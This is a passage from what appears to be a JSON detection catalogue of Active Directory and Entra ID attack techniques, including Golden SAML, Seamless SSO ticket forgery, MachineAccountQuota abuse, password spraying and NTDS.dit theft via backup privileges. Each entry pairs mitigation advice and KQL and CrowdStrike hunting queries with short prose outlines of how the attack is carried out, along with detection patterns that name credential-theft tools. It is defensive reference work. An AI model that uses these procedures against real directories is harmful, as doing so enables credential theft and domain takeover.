InitiatingProcessCommandLine"},{"plat":"MDE","t":"OpenProcess / token-modify API against the PTA agent process = remote injection black / only legitimate agent startup = white","q":"DeviceEvents\n| where Timestamp > ago(1d)\n| where ActionType in (\"OpenProcessApiCall\", \"ProcessPrimaryTokenModified\", \"SensitiveApiCall\")\n| where AdditionalFields has \"AzureADConnectAuthenticationAgent\" or InitiatingProcessFileName =~ \"AzureADConnectAuthenticationAgentService.exe\"\n| where InitiatingProcessFileName !in~ (\"AzureADConnectAuthenticationAgentService.exe\", \"services.exe\")\n| project Timestamp, DeviceName, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine, AdditionalFields"}],"huntcs":[{"plat":"Event Search","t":"PTA agent backdoor tooling; PTASpy install or tampering with AzureADConnectAuthenticationAgent = black.","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*PTASpy*\" OR CommandLine=\"*Install-AADIntPTASpy*\" OR CommandLine=\"*AzureADConnectAuthenticationAgent*\" OR CommandLine=\"*Register-AADIntPTAAgent*\")\n| stats count values(CommandLine) as cmd by ComputerName, UserName, FileName, ParentBaseFileName\n| sort - count"},{"plat":"Event Search","t":"Remote-thread/injection into the PTA agent process on the agent host; any injection targeting the auth-agent PID = black.","q":"event_simpleName=ProcessInjection\n| stats count by aid, ComputerName, ContextProcessId, TargetProcessId\n| sort - count\n// join TargetProcessId to ProcessRollup2 where FileName=AzureADConnectAuthenticationAgentService.exe to confirm PTA agent target"}]},{"name":"Seamless SSO Silver Ticket (AZUREADSSOACC)","aka":"Seamless SSO abuse, AzureADSSOACC Kerberos ticket forgery","phase":"trust","group":"Cloud / Hybrid (Entra)","mitre":"T1558, T1550","cve":"","sev":"High","summary":"Steals the Kerberos key of the AZUREADSSOACC$ computer account created by Seamless SSO to forge a cloud SSO ticket (Silver Ticket equivalent) impersonating any user.","how":"Prereq: obtain the NTLM hash/AES key of AZUREADSSOACC$ from an on-prem DC. This account's password is not rotated by default, so any user's cross-boundary SSO ticket can be forged to sign into Entra.","tools":"AADInternals `Get-AADIntSeamlessSSO`/チケット鍛造, mimikatz, impacket","detect":"Anomalous Kerberos use tied to AZUREADSSOACC$, Seamless SSO sign-ins from unexpected sources, hash access to the target account.","events":"Entraサインインログ, 4769, 4662","mitigate":"Rotate the AZUREADSSOACC$ password regularly, Conditional Access + MFA, reassess the need for Seamless SSO, Tier0 protection.","triage":"A forged Seamless SSO silver ticket is minted offline from the AZUREADSSOACC$ key and presented directly to Azure AD's autologon endpoint, so the on-prem DC logs neither 4768 nor 4769 for the forged use. DC 4769 alone therefore cannot detect the forgery; the primary signal is an Entra sign-in showing Seamless SSO success from an atypical country/IP/device with no corresponding on-prem Kerberos activity. It chains to black when preceded by theft of the AZUREADSSOACC$ key (DC 4662 / replication = DCSync). Legitimate browser SSO is benign: a domain-joined host produces 4768 then an AES (0x12) 4769 at the DC, with the Entra sign-in from corporate IP.","hunt":[{"plat":"Sentinel","t":"RC4 (0x17) TGS request for the AZUREADSSOACC$ SPN = Seamless SSO silver-ticket forgery black / AES (0x12) legitimate request = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769\n| where ServiceName has \"AZUREADSSOACC\"\n| where TicketEncryptionType == \"0x17\"\n| summarize reqs=count(), srcIPs=make_set(IpAddress) by TargetUserName, bin(TimeGenerated, 1h)\n| where reqs > 0"},{"plat":"Entra","t":"Seamless SSO (WIA) successful sign-in from an unexpected country/IP = forged-ticket use black / domain-joined corp endpoint = white","q":"SigninLogs\n| where TimeGenerated > ago(1d)\n| where ResultType == 0\n| where AuthenticationRequirement == \"singleFactorAuthentication\"\n| where AppDisplayName has_any (\"Office\", \"Azure Portal\", \"Windows Sign In\")\n| summarize signins=count(), locs=make_set(Location), ips=make_set(IPAddress) by UserPrincipalName, bin(TimeGenerated, 1h)\n| where array_length(locs) > 1"}],"huntcs":[{"plat":"Event Search","t":"Silver-ticket forgery targeting AZUREADSSOACC$; Rubeus/mimikatz referencing the SSO computer account = black.","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*AZUREADSSOACC*\" OR CommandLine=\"*aad_seamless*\" OR (CommandLine=\"*Rubeus*\" AND CommandLine=\"*silver*\") OR CommandLine=\"*/service:HTTP/autologon*\" OR CommandLine=\"*golden*aad*\")\n| stats count values(CommandLine) as cmd by ComputerName, UserName, FileName, ParentBaseFileName\n| sort - count"},{"plat":"Identity Protection","t":"AZUREADSSOACC$ Kerberos etype anomalies (4769) are DC-only; correlate via Falcon Identity Protection ticket-anomaly detection.","q":"// Falcon Identity Protection detection: forged/anomalous Kerberos ticket for AZUREADSSOACC$ — no EDR ticket telemetry; pivot to attacker-host tooling above"}]},{"name":"Golden SAML (ADFS Token-Signing Certificate Theft)","aka":"Golden SAML, ADFS token signing cert abuse","phase":"trust","group":"Cloud / Hybrid (Entra)","mitre":"T1606.002","cve":"","sev":"Critical","summary":"Steals the ADFS token-signing certificate/DKM key to generate valid SAML tokens offline for any user and any claim (including MFA satisfaction), enabling unlimited sign-in to federated targets (Entra/SaaS).","how":"Prereq: admin access to the ADFS server or the AD holding the DKM key. Extract the token-signing certificate and DKM master key, then sign SAML assertions with any NameID/claims (including MFA claim). Valid long-term until certificate renewal.","tools":"AADInternals `Export-AADIntADFSSigningCertificate`/`New-AADIntSAMLToken`, mimikatz, ADFSDump/ADFSpoof","detect":"Sign-ins that succeed without a corresponding ADFS issuance log entry, anomalous NameID/issuance times, tokens with an MFA claim despite no MFA performed, certificate export traces.","events":"ADFS 1200/1202, Entraサインインログ, 4662, 4624","mitigate":"Protect the token-signing certificate and DKM in an HSM/hardened store, keep ADFS Tier0, rotate certificates, restrict issuer/location via Conditional Access, and where possible retire federation in favor of cloud auth.","triage":"In the Entra sign-in log, isolate successful federated sign-ins that have NO matching ADFS 1200 (token issued)/1202 at the issuing ADFS (correlation gap), and check for anomalous NameID, skewed issue times, or an MFA claim without an actual MFA event. It is malicious when this correlates in time with DKM/token-signing access on the ADFS or DKM-holding AD server (4662 on the DKM container) or export traces (4688: ADFSDump/ADFSpoof/mimikatz). It is benign for certificate rotation and genuine federation where each sign-in maps 1:1 to an ADFS 1200 from corporate sources with consistent MFA.","hunt":[{"plat":"MDE","t":"Tooling extracting the token-signing cert / DKM key on the ADFS server (AADInternals/ADFSDump/mimikatz) = Golden SAML prep black / only legit ADFS service = white","q":"DeviceProcessEvents\n| where Timestamp > ago(7d)\n| where ProcessCommandLine has_any (\"Export-AADIntADFS\", \"ADFSDump\", \"token-signing\", \"AdfsDkm\", \"Get-AdfsProperties\", \"DKM\", \"Thales\")\n    or (FileName =~ \"powershell.exe\" and ProcessCommandLine has \"ADFS\" and ProcessCommandLine has_any (\"Certificate\", \"PrivateKey\", \"Export\"))\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName"},{"plat":"Entra","t":"Federated privileged user signing in with an MFA-satisfied claim from a new IP with no matching ADFS issuance = Golden SAML black / usual IP with legit issuance = white","q":"SigninLogs\n| where TimeGenerated > ago(1d)\n| where ResultType == 0\n| where AuthenticationRequirement == \"multiFactorAuthentication\"\n| where ConditionalAccessStatus != \"success\" or ClientAppUsed !in (\"Browser\", \"Mobile Apps and Desktop clients\")\n| summarize signins=count(), ips=make_set(IPAddress), apps=make_set(AppDisplayName) by UserPrincipalName, bin(TimeGenerated, 1h)\n| where array_length(ips) >= 1"}],"huntcs":[{"plat":"Event Search","t":"ADFS token-signing cert / DKM theft tooling; Export-AADIntADFS or ADFSDump on the ADFS host = black.","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*Export-AADIntADFS*\" OR CommandLine=\"*ADFSDump*\" OR CommandLine=\"*token-signing*\" OR CommandLine=\"*Get-AdfsProperties*\" OR CommandLine=\"*ADFS*DKM*\" OR CommandLine=\"*Set-AdfsProperties*\")\n| stats count values(CommandLine) as cmd by ComputerName, UserName, FileName, ParentBaseFileName\n| sort - count"},{"plat":"Identity Protection","t":"SAML sign-ins with no matching ADFS issuance are cloud/ADFS-side; correlate via Falcon Identity Protection and audit-log ingestion.","q":"// Falcon Identity Protection detection: Golden SAML — token issued outside ADFS; no EDR signal, hunt cert-theft process above + Entra sign-in correlation"}]},{"name":"External Trust / SID Filtering CVE-class Bypass","aka":"CVE-2020-0665, netdom quarantine misconfig, external trust abuse","phase":"trust","group":"Trust / Cross-Forest","mitre":"T1134.005","cve":"","sev":"High","summary":"Exploits implementation/configuration flaws in external trusts or SID filtering (e.g. quarantine not applied) to pass SIDs across a trust boundary that should be dropped, achieving elevation.","how":"Prereq: compromise one environment and check the trust type (external/forest) and SID filter state (netdom trust /verify, TDO attributes). On external trusts without quarantine or unpatched environments, use a forged ticket injected with SIDs that bypass filtering.","tools":"mimikatz, impacket, netdom(状態確認), BloodHound","detect":"Unexpected SID use across an external trust, TDO/trust flag changes, high-privilege cross-boundary access.","events":"4706/4716(トラスト作成/変更), 4769, 4662","mitigate":"Apply the relevant patches, enforce quarantine on external trusts, remove unneeded trusts, selective authentication, periodic audit of trust configuration.","triage":"On the target-forest DC, inspect 4769/4768 and the SID History/extra SIDs in the TGS to see whether cross-trust access succeeds with a high-privilege SID that SID filtering (quarantine) should strip (e.g., Enterprise Admins RID 519, domain RID <1000). It is malicious when a preceding 4706/4716 trust creation/modification or TDO filter-flag change chains into cross-realm 4662/privileged logons. It is benign for approved trust changes or migrations (legitimate SID History) and known cross-access where the change is documented and the SIDs are within the expected range.","hunt":[{"plat":"Sentinel","t":"Unplanned creation/modification of external/forest trust (4706/4716) = SID-filtering-bypass black / change within approved change management = white","q":"SecurityEvent\n| where TimeGenerated > ago(7d)\n| where EventID in (4706, 4716)\n| project TimeGenerated, EventID, Computer, Actor=SubjectUserName, TrustDomain=TargetUserName, Activity, Properties\n| sort by TimeGenerated desc"},{"plat":"Sentinel","t":"Spike of cross-trust TGS access using high-privilege-equivalent SIDs = cross-boundary escalation black / steady low cross-trust use = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769\n| where TargetDomainName != SubjectDomainName and isnotempty(TargetDomainName)\n| where TicketEncryptionType == \"0x17\"\n| summarize reqs=count(), services=make_set(ServiceName) by SubjectUserName, TargetDomainName, IpAddress\n| where reqs > 20"}],"huntcs":[{"plat":"Event Search","t":"Trust/SID-filtering tampering; netdom trust /quarantine:No or nltest trust recon on a host = black.","q":"event_simpleName=ProcessRollup2 (FileName=\"netdom.exe\" OR FileName=\"nltest.exe\" OR CommandLine=\"*quarantine:No*\" OR CommandLine=\"*/quarantine*\" OR CommandLine=\"*domain_trusts*\" OR CommandLine=\"*New-ADTrust*\")\n| stats count values(CommandLine) as cmd by ComputerName, UserName, FileName, ParentBaseFileName\n| sort - count"}]},{"name":"MachineAccountQuota Abuse (ms-DS-MachineAccountQuota)","aka":"MAQ abuse / arbitrary machine account creation / addcomputer","phase":"recon","group":"Foundational Primitives","mitre":"T1136.002","cve":"","sev":"High","summary":"With the default MachineAccountQuota of 10, any authenticated standard user can create their own computer account — a foundational primitive granting a controlled account to seed follow-on attacks.","how":"With any domain credentials, create a computer account via impacket-addcomputer or PowerMad's New-MachineAccount. The creator controls that account's msDS-KeyCredentialLink, SPN, and servicePrincipalName, and it is a common prerequisite for noPac (CVE-2021-42278/42287), RBCD, Shadow Credentials, and Certifried (CVE-2022-26923). No domain-join right or GenericWrite is needed; it works whenever MAQ >= 1.","tools":"impacket addcomputer.py, PowerMad (New-MachineAccount), StandIn, ntlmrelayx --add-computer","detect":"In Directory Service auditing, flag Security event 4741 (computer account created) where the creator (Subject) is not an admin or a dedicated domain-join account. Periodically audit for multiple machine accounts created by a single user in a short window, or computer objects whose mS-DS-CreatorSID is a standard-user SID.","events":"4741 (computer account created), 4742 (computer account changed), 5136 (mSDS-CreatorSID / servicePrincipalName変更)","mitigate":"Set ms-DS-MachineAccountQuota to 0 and restrict computer creation to delegated dedicated accounts/OU permissions only. Inventory existing mS-DS-CreatorSID values, delete machine accounts created by standard users, and control delegated creation via SDDL.","triage":"On the DC, pull 4741 (computer account created) where the Subject is an ordinary user rather than a dedicated join/service account or admin, or where mS-DS-CreatorSID is a normal-user SID. It is malicious when one user creates several accounts in a short window and 4742/5136 immediately show changes to that machine's servicePrincipalName, msDS-KeyCredentialLink, or msDS-AllowedToActOnBehalfOf, chaining into noPac/RBCD/Shadow Credentials/Certifried. It is benign for SCCM/Intune/OSD imaging or help-desk domain joins when the creator is a known provisioning account, naming conventions hold, and no SPN/attribute edits follow.","hunt":[{"plat":"Sentinel","t":"Non-admin account creating multiple computer accounts (4741) in a short window = MachineAccountQuota abuse black / one-off join by an admin = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4741\n| where SubjectUserName !endswith \"$\"\n| summarize created=count(), machines=make_set(TargetUserName) by SubjectUserName, SubjectDomainName, bin(TimeGenerated, 1h)\n| where created >= 2"},{"plat":"Sentinel","t":"5136 change whose Properties show SPN/RBCD attributes added to a computer object = RBCD-style attack setup black / attribute set by a legit deployment tool = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has_any (\"servicePrincipalName\", \"msDS-AllowedToActOnBehalfOfOtherIdentity\", \"mS-DS-CreatorSID\")\n| where SubjectUserName !endswith \"$\" and isnotempty(SubjectUserName)\n| project TimeGenerated, Computer, Actor=SubjectUserName, TargetObject=ObjectName, OperationType, Properties"}],"huntcs":[{"plat":"Event Search","t":"MachineAccountQuota abuse tooling; Impacket addcomputer / PowerMad New-MachineAccount = black.","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*addcomputer*\" OR CommandLine=\"*New-MachineAccount*\" OR CommandLine=\"*PowerMad*\" OR CommandLine=\"*ms-DS-MachineAccountQuota*\" OR CommandLine=\"*Set-MachineAccountAttribute*\")\n| stats count values(CommandLine) as cmd by ComputerName, UserName, FileName, ParentBaseFileName\n| sort - count"},{"plat":"Identity Protection","t":"Computer-account creation (4741) is a DC audit event; flag non-admin creators / rapid bulk creation via Falcon Identity Protection.","q":"// Falcon Identity Protection detection: unexpected new machine account created by a non-privileged SID — pivot to attacker-host tooling above"}]},{"name":"SOAPHound / ADWS(SOAP) Stealthy Enumeration","aka":"SoaPy / ADWS collection / BloodHound over ADWS","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1087.002","cve":"","sev":"Medium","summary":"Collects BloodHound-equivalent directory data via ADWS (TCP 9389, SOAP/MC-NBFX) instead of LDAP, evading LDAP-based detection and event 1644 — a stealthy enumeration technique.","how":"Use SOAPHound (.NET) or SoaPy (Linux) to send NBFX/NBFSE-compressed SOAP queries to the DC's ADWS endpoint, collecting users, groups, ACLs, and trusts to produce BloodHound-compatible JSON. Since ADWS is the legitimate path used by the PowerShell AD module, it bypasses LDAP query logging, SACLs, and most EDR LDAP monitoring. Runs with only authenticated standard-user credentials.","tools":"SOAPHound, SoaPy, FalconHound, 標準ADWS (ActiveDirectory PowerShell module)","detect":"Monitor for anomalous source/volume of ADWS (NetTCP 9389) connections on DCs; detect standard workstations hitting ADWS when normally only Tier0 admin hosts or AADConnect do. At the network layer, surface bulk MC-NMF/NBFX enumeration traffic.","events":"ADWS接続ログ (Directory Service / 4662 大量読取), Sysmon Event 3 (TCP 9389への接続), NetFlow上の9389","mitigate":"Restrict ADWS access to the admin host segment (limit 9389 via host firewall) and isolate Tier0 management. Rather than relying on detecting BloodHound collection, reduce the excessive permissions/ACLs that make enumeration valuable in the first place.","triage":"On the DC, use Sysmon EID3 and NetFlow to profile connections to TCP 9389 (ADWS) by source and volume, checking whether a normal workstation is hitting ADWS that usually only Tier0 admin hosts or AAD Connect use. It is malicious when a single source sweeps all users/groups/ACLs/trusts in a short burst (broad 4662 property reads if SACL'd) as MC-NMF/NBFX-compressed traffic. It is benign for RSAT ActiveDirectory PowerShell module use, monitoring/asset inventory, or IGA products issuing scheduled queries when the source is a known admin host and the query scope is bounded.","hunt":[{"plat":"MDE","t":"General workstation making heavy connections to DC ADWS (TCP 9389) = SOAPHound/SoaPy enumeration black / only Tier0 admin hosts / AADConnect = white","q":"DeviceNetworkEvents\n| where Timestamp > ago(1d)\n| where RemotePort == 9389\n| where ActionType == \"ConnectionSuccess\"\n| summarize conns=count(), targets=make_set(RemoteIP), proc=make_set(InitiatingProcessFileName) by DeviceName, InitiatingProcessAccountName\n| where conns > 50"},{"plat":"MDI","t":"LDAP enumeration from a single host sweeping many object types in a short window = BloodHound-style full collection black / a few fixed app queries = white","q":"IdentityQueryEvents\n| where Timestamp > ago(1d)\n| where QueryType == \"LDAP\"\n| summarize queries=count(), distinctTargets=dcount(QueryTarget), samples=make_set(Query, 10) by AccountName, DeviceName, IPAddress, bin(Timestamp, 15m)\n| where queries > 200 and distinctTargets > 50"}],"huntcs":[{"plat":"Event Search","t":"ADWS (TCP 9389) connections to DCs by source and fan-out; a workstation hitting multiple DCs on 9389 = black (SOAPHound).","q":"event_simpleName=NetworkConnectIP4 RemotePort=9389\n| stats dc(RemoteAddressIP4) as dc_count count by aid, ComputerName, ContextBaseFileName\n| where dc_count >= 2\n| sort - dc_count"},{"plat":"Event Search","t":"ADWS collection tooling on the host; soaphound / SoaPy / ADWS BloodHound = black.","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*soaphound*\" OR CommandLine=\"*SoaPy*\" OR CommandLine=\"*--adws*\" OR CommandLine=\"*9389*\" OR CommandLine=\"*NetTcpBinding*\")\n| stats count values(CommandLine) as cmd by ComputerName, UserName, FileName, ParentBaseFileName\n| sort - count"}]},{"name":"Plaintext Credentials in AD Attributes","aka":"description/info/userPassword/unixUserPassword hunting, LAPS attribute read","phase":"recon","group":"Credential Discovery","mitre":"T1552","cve":"","sev":"High","summary":"An authenticated user enumerates and steals credentials stored in plaintext in attributes like description, info, userPassword, and unixUserPassword — attribute-based credential hunting beyond GPP cpassword.","how":"Via LDAP, enumerate description, info, comment, userPassword, unixUserPassword, ms-Mcs-AdmPwd (LAPS), etc. across all users/computers and search for keywords like password/pass/pwd. userPassword and unixUserPassword are sometimes stored as BASE64/plaintext and are often readable by anyone via Get-ADUser -Properties * or ldapsearch.","tools":"ldapsearch, PowerView (Get-DomainUser), ldeep, BloodHound, adPEAS, Snaffler(共有側)","detect":"Because detecting bulk reads of description/info via Directory Service Access auditing (4662) is hard, actively hunt for objects containing plaintext passwords via periodic attribute scans. Treat the mere presence of values in userPassword/unixUserPassword as anomalous and alert.","events":"4662 (property read, GUID指定SACL時), 定期LDAP棚卸しレポート","mitigate":"End the practice of storing credentials in attributes like description/info and scrub existing values via script. Disable plaintext storage in userPassword (fUserPwdSupport); treat LAPS attributes as confidential and minimize read permissions via ACL.","triage":"Run a scheduled LDAP inventory to surface objects whose description/info/comment/userPassword/unixUserPassword/ms-Mcs-AdmPwd hold password/pass/pwd keywords or plaintext/BASE64 values, and (if SACL'd) check 4662 for the source of broad reads of these attributes. It is malicious when a single host enumerates all objects in a short window and this chains into lateral logons (4624 Type 3) using those credentials. It is benign for legitimate scans by inventory/migration/audit tooling, or legacy data merely sitting in userPassword with no abusive logon (though plaintext storage should still be remediated).","hunt":[{"plat":"MDI","t":"Many LDAP queries targeting description/info/userPassword/LAPS attributes = plaintext-credential hunting black / limited business attribute reads = white","q":"IdentityQueryEvents\n| where Timestamp > ago(1d)\n| where QueryType == \"LDAP\"\n| where Query has_any (\"description\", \"userPassword\", \"unixUserPassword\", \"info\", \"ms-Mcs-AdmPwd\", \"msLAPS-Password\")\n| summarize reads=count(), samples=make_set(Query, 8), targets=dcount(QueryTarget) by AccountName, DeviceName, IPAddress\n| where reads > 20 or targets > 50"},{"plat":"Sentinel","t":"Non-admin 4662 access to objects with LAPS/sensitive attributes = attribute-read abuse black / authorized LAPS reader host = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662\n| where Properties has_any (\"ms-Mcs-AdmPwd\", \"msLAPS-Password\", \"ms-Mcs-AdmPwdExpirationTime\")\n| where SubjectUserName !endswith \"$\"\n| summarize reads=count(), objs=make_set(ObjectName) by SubjectUserName, Computer, bin(TimeGenerated, 1h)\n| where reads > 5"}],"huntcs":[{"plat":"Event Search","t":"LDAP enumeration of password-bearing attributes; tooling reading description/userPassword/unixUserPassword = black.","q":"event_simpleName=ProcessRollup2 ((CommandLine=\"*description*\" OR CommandLine=\"*userPassword*\" OR CommandLine=\"*unixUserPassword*\" OR CommandLine=\"*ms-Mcs-AdmPwd*\") AND (CommandLine=\"*Get-ADUser*\" OR CommandLine=\"*Get-ADObject*\" OR CommandLine=\"*ldapsearch*\" OR CommandLine=\"*adexplorer*\" OR CommandLine=\"*ldapdomaindump*\"))\n| stats count values(CommandLine) as cmd by ComputerName, UserName, FileName\n| sort - count"}]},{"name":"SCCM/MECM Environment Enumeration","aka":"SharpSCCM recon, sccmhunter, PXE OSD enumeration","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1087.002","cve":"","sev":"High","summary":"Reconnaissance that enumerates SCCM/MECM infrastructure — site servers, management points (MP), distribution points (DP), the Network Access Account (NAA), and PXE media — to map a major attack surface for large-scale AD compromise.","how":"Use sccmhunter or SharpSCCM to enumerate the System Management container (AD-published SCCM sites), SPNs like MSSMSMPname, and devices/collections/NAA via the management point's HTTP/WMI interface. Against PXE-enabled DPs, request OSD media unauthenticated and recover the encrypted NAA credentials from the boot variables (policy).","tools":"SharpSCCM (get), sccmhunter (find/show/get), PXEThief, ldapsearch (System Managementコンテナ)","detect":"Monitor for anomalous HTTP/WMI policy requests to management points (MP), bulk LDAP reads of the System Management container, and PXE/TFTP (UDP 69) requests from non-legitimate devices. Detect known SharpSCCM/PXEThief User-Agents and policy-request patterns in MP logs.","events":"MP IISログ (ポリシー要求), 4662 (System Managementコンテナ読取), TFTP/PXEアクセスログ","mitigate":"Set a PXE password and move off NAA entirely to Enhanced HTTP/management-point authentication. Minimize NAA privileges to block lateral movement to MSSQL/SMB shares. Review the System Management container ACL.","triage":"In the management-point (MP) IIS logs, look for anomalous policy requests (SharpSCCM/PXEThief User-Agents or bulk device/collection/NAA requests) together with heavy 4662 reads of the System Management container and non-client requests to PXE/TFTP (UDP 69). It is malicious when the source is a non-managed, non-client host and unauthenticated PXE boot-variable NAA recovery chains into access with those credentials. It is benign for genuine SCCM clients, software distribution, OSD/PXE boot, or baseline evaluation when the source is a known client/DP and request patterns match normal operations.","hunt":[{"plat":"MDI","t":"LDAP reads of the System Management container / SCCM attributes from a general account = SharpSCCM/sccmhunter recon black / SCCM server's own steady queries = white","q":"IdentityQueryEvents\n| where Timestamp > ago(1d)\n| where QueryType == \"LDAP\"\n| where Query has_any (\"System Management\", \"mSSMSManagementPoint\", \"mSSMSSite\", \"mSSMSMPName\", \"mSSMSDefaultMP\")\n| summarize reads=count(), samples=make_set(Query, 6) by AccountName, DeviceName, IPAddress\n| where reads > 5"},{"plat":"MDE","t":"Non-standard device hitting PXE/TFTP (UDP 69) or the MP = PXEThief/SharpSCCM OSD theft black / a known OSD client boot = white","q":"DeviceNetworkEvents\n| where Timestamp > ago(1d)\n| where RemotePort == 69 or (RemotePort in (80, 443) and RemoteUrl has_any (\"CCM_System\", \"SMS_MP\", \"GetPolicy\"))\n| summarize hits=count(), targets=make_set(RemoteIP), proc=make_set(InitiatingProcessFileName) by DeviceName, InitiatingProcessAccountName\n| where hits > 0"}],"huntcs":[{"plat":"Event Search","t":"SCCM recon tooling on the host; SharpSCCM / sccmhunter / PXEThief = black.","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*SharpSCCM*\" OR CommandLine=\"*sccmhunter*\" OR CommandLine=\"*PXEThief*\" OR CommandLine=\"*get naa*\" OR CommandLine=\"*System Management*\" OR CommandLine=\"*Get-SCCM*\")\n| stats count values(CommandLine) as cmd by ComputerName, UserName, FileName, ParentBaseFileName\n| sort - count"},{"plat":"Event Search","t":"PXE/TFTP (UDP 69) connection sources; a non-OSD host requesting PXE media = black (PXEThief).","q":"event_simpleName=NetworkConnectIP4 RemotePort=69\n| stats count by aid, ComputerName, ContextBaseFileName, RemoteAddressIP4\n| sort - count"}]},{"name":"Generic Password Spraying (SMB/LDAP/RDP/OWA-EWS)","aka":"non-Kerberos password spray, OWA/EWS spray","phase":"credaccess","group":"Password Attacks","mitre":"T1110.003","cve":"","sev":"High","summary":"Lockout-avoiding credential spraying that spans non-AS-REQ auth surfaces (SMB, LDAP, RDP, OWA/EWS) trying a few common passwords against many accounts.","how":"Against a collected user-enumeration list, spray guessed passwords like Season2024! to SMB (445)/LDAP (389)/RDP/OWA-EWS (443) below the lockout threshold (1 attempt/account/observation window), distributed. Exploits that lockout policy and badPwdCount propagation differ by protocol; externally exposed OWA/EWS is especially stealthy.","tools":"NetExec/NetExec, kerbrute(AS-REQ側), SprayingToolkit(atomizer/MailSniper), Hydra, Go365","detect":"Correlate 4771/4625 failures spanning multiple accounts from a single source IP in a short window. For OWA/EWS, correlate bursts of User-Agent and auth failures in Exchange/IIS logs and many-user attempts from one source in the SIEM. Monitor for broad, small increases in badPwdCount.","events":"4625 (logon failure), 4771 (Kerberos pre-auth failed), 4776 (NTLM認証), Exchange/IISログ (OWA/EWS 401)","mitigate":"Apply smart lockout (Azure AD/on-prem) and MFA (especially OWA/EWS) across all auth surfaces and disable legacy auth (Basic/EWS). Enforce a strong password policy and a breached-password dictionary block.","triage":"Correlate DC 4771 (Kerberos pre-auth failure, Failure Code 0x18)/4768 and target 4625 (LogonType 3/10)/4776 to find a single source IP failing across many distinct accounts a few times each, and watch for broad badPwdCount creep. It is malicious when OWA/EWS Exchange/IIS logs show a 401 burst from one source across many users with a specific User-Agent, followed by a single success and anomalous sign-in. It is benign for vuln scanners, monitoring, NAC, or apps retrying an expired password, and for failures concentrated on one account from a known scanner source.","hunt":[{"plat":"Sentinel","t":"One source IP failing many distinct accounts in a short window (4771/4625/4776) = password spray black / repeated failures on one account = lockout/whiteish","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4625, 4771, 4776)\n| where isnotempty(IpAddress) and IpAddress != \"-\"\n| summarize failedAccounts=dcount(TargetUserName), attempts=count(), users=make_set(TargetUserName, 20) by IpAddress, bin(TimeGenerated, 15m)\n| where failedAccounts >= 10"},{"plat":"Entra","t":"Legacy-auth (OWA/EWS/IMAP) failure burst from one IP across many UPNs = cloud-side spray black / sporadic failures from legit clients = white","q":"SigninLogs\n| where TimeGenerated > ago(1d)\n| where ResultType != 0\n| where ClientAppUsed in (\"Exchange Web Services\", \"IMAP4\", \"POP3\", \"Other clients\", \"Authenticated SMTP\", \"Exchange ActiveSync\")\n| summarize failedUsers=dcount(UserPrincipalName), attempts=count() by IPAddress, ClientAppUsed, bin(TimeGenerated, 30m)\n| where failedUsers >= 10"}],"huntcs":[{"plat":"Event Search","t":"Correlates failed logons by source; one IP failing across many distinct accounts in a burst = black (spray).","q":"event_simpleName=UserLogonFailed2\n| stats dc(UserName) as users count by RemoteAddressIP4, LogonType, ComputerName\n| where users >= 10\n| sort - users"},{"plat":"LogScale","t":"LogScale aggregation of cross-account failures per source IP; user fan-out above threshold = black.","q":"#event_simpleName=UserLogonFailed2\n| groupBy([RemoteAddressIP4, LogonType], function=[count(as=fails), count(UserName, distinct=true, as=users)])\n| users >= 10\n| sort(users, order=desc)"}]},{"name":"SeBackupPrivilege / SeRestorePrivilege Abuse","aka":"robocopy /b, esentutl, diskshadow, SAM/SYSTEM/NTDS.dit theft","phase":"credaccess","group":"Host / Local","mitre":"T1003.002, T1003.003","cve":"","sev":"High","summary":"Abuses backup privileges to directly steal registry hives (SAM/SYSTEM) or NTDS.dit via file copy without VSS/DCSync — directly tied to abuse of Backup Operators and similar.","how":"With SeBackupPrivilege, use robocopy /b, esentutl /y, or the Win32 Backup API to bypass ACLs and copy locked files. On a DC, create a shadow copy with diskshadow to extract NTDS.dit and the SYSTEM hive, then extract offline with secretsdump. On member servers, recover local credentials from SAM/SYSTEM/SECURITY.","tools":"robocopy /b, esentutl /y /vss, diskshadow, SeBackupPrivilegeCmdLets, impacket-secretsdump, reg save","detect":"Detect diskshadow launch, esentutl/robocopy access to NTDS.dit or hives, and file access under System32\\config or the ntds path via EDR/auditing (4663). Correlate backup-privilege assignment (4672) with privilege use by processes other than backup products.","events":"4672 (special privileges assigned), 4663 (object access to SAM/ntds.dit), Sysmon 1/11 (esentutl.exe, diskshadow.exe, robocopy /b)","mitigate":"Strictly minimize members of SeBackupPrivilege-holding groups like Backup Operators, and limit interactive logon/remote operations on DCs to Tier0. Restrict backups to a dedicated service account + admin host only, and restrict execution of diskshadow/esentutl.","triage":"On the target host (especially a DC), use Sysmon EID1/11 for launches of diskshadow.exe, esentutl.exe (/y /vss) and robocopy (/b), plus 4663 file access to C:\\Windows\\NTDS\\ntds.dit and System32\\config SAM/SYSTEM/SECURITY. It is malicious when a 4672 SeBackupPrivilege-holding process that is NOT a backup product copies hives/NTDS.dit and this chains into exfiltration or offline secretsdump. It is benign for Veeam/Windows Server Backup/legitimate VSS or a scheduled backup job when the actor is a known backup service account during a maintenance window running the product's own process.","hunt":[{"plat":"MDE","t":"esentutl/diskshadow/robocopy /b/ntdsutil grabbing NTDS.dit or SAM/SYSTEM hives = backup-privilege abuse black / legit run by a backup product = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where FileName in~ (\"esentutl.exe\", \"diskshadow.exe\", \"robocopy.exe\", \"ntdsutil.exe\", \"wbadmin.exe\")\n| where ProcessCommandLine has_any (\"ntds\", \" /b \", \"system32\\\\config\", \"\\\\SYSTEM\", \"\\\\SAM\", \"ifm\", \"create full\", \"/y /vss\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, 